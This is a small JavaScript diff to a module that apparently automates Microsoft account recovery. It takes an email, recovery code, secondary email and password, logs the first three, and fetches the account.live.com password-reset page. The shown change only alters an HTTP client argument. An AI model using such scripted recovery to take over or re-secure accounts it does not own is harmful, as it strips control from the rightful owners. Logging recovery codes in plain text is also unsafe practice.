@@ -4,7 +4,7 @@ module.exports = async (email, recoveryCode, secEmail, password) => {
     console.log(`Recovery secure called with ${email} ${recoveryCode} ${secEmail}`);
 
     try {
-        const axios = new HttpClient();
+        const axios = new HttpClient(false);
 
         const data = await axios.get(
             `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${encodeURIComponent(email)}`,
